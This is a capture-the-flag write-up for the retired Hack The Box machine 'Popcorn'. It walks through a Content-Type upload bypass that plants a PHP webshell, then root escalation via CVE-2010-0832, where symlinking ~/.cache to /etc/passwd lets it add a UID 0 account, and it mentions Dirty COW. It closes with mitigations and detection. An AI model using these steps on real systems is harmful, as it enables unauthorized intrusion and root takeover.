---
machine: Popcorn
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, upload, pam, dirtycow, privesc]
---

# Popcorn — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Torrent Hoster allows registration and an image upload for each torrent. The filter only checks `Content-Type`, not the extension or content: a `.php` webshell sent as `image/png` executes from `/torrent/upload/` and gives a shell as `www-data`. The box is Ubuntu 9.10 with an old PAM vulnerable to CVE-2010-0832: on login, `~/.cache` is created as root. Replacing it with a symlink to `/etc/passwd` and logging in again over SSH grants write access, allowing a root user to be added. Dirty COW is the kernel alternative.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 5.1p1.
- `80` Apache 2.2.12 on Ubuntu 9.10.
- The root is the default page; `gobuster` finds `/test`, `/rename` and `/torrent`.

`/test` is a `phpinfo()` page; `/torrent` is Torrent Hoster with registration, login and torrent uploads.

## Enumeration

Register an account, upload a valid `.torrent` and edit it to attach an image. The image is served from:

```text
/torrent/thumbnail.php?gd=2&src=./upload/<hash>.png&maxw=96
```

`/torrent/upload/` allows directory listing. The application validates the upload type, but inconsistently.

## Foothold

Test the filter one change at a time:

- changing the extension to `.php` is not blocked;
- changing `Content-Type` to `application/x-php` is blocked;
- changing only the content is not blocked.

Send a PHP webshell named `.php` with `Content-Type: image/png`:

```bash
curl -s 'http://<IP>/torrent/upload/<hash>.php?cmd=id'
```

The response confirms `www-data`. Use `cmd` to launch a reverse shell and get an interactive session.

## Lateral movement

There is no hop: `www-data` can read `george`'s flag and enumerate his home. It contains `.cache/motd.legal-displayed`, created by PAM at login.

## Privilege escalation

Ubuntu 9.10's PAM creates `~/.cache` owned by root during authentication. The CVE-2010-0832 exploit removes that directory, replaces it with a symlink to the target file and forces a new SSH login; the file becomes owned by the user.

Manually:

```bash
# as www-data, with your own SSH key in authorized_keys
rm -rf ~/.cache
ln -s /etc/passwd ~/.cache
ssh -i key www-data@<IP> true
ls -l /etc/passwd
```

After the login, `/etc/passwd` is writable by `www-data`. Generate a hash and add an account with UID/GID 0:

```bash
openssl passwd -1 '<PASSWORD>'
echo 'pwned:<HASH>:0:0:pwned:/root:/bin/bash' >> /etc/passwd
su - pwned
```

The alternative is Dirty COW: kernel `2.6.31` is vulnerable, and `dirty.c` modifies `/etc/passwd` to create a root user.

## Evidence

- `phpinfo()` at `/test` and the upload form at `/torrent`.
- Webshell running `id` as `www-data`.
- `.cache/motd.legal-displayed` in `george`'s home.
- `/etc/passwd` owned by `www-data` after the second login.
- `id` with UID 0.

## Lessons learned

- Validating only `Content-Type` does not stop executable uploads.
- An upload directory inside the webroot turns an image into a webshell.
- Old systems accumulate PAM and kernel vulnerabilities.
- A root-created file in a user-controlled path can change ownership of critical files.

## Mitigations and detection

- Validate extension, real MIME, magic bytes and content; rename files and serve them outside the webroot.
- Disable PHP execution in upload directories.
- Update PAM and the kernel; do not let `~/.cache` be a symlink.
- Monitor ownership changes on `/etc/passwd` and `/etc/shadow`.
- Detect `.php` files in `upload/`, webshell requests and repeated SSH logins from the same account.

## References

- [0xdf — Popcorn](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)
- [IppSec — Popcorn](https://www.youtube.com/watch?v=NMGsnPSm8iw)
- [NVD — CVE-2010-0832](https://nvd.nist.gov/vuln/detail/CVE-2010-0832)
- [Hack The Box — Popcorn](https://app.hackthebox.com/machines/popcorn)
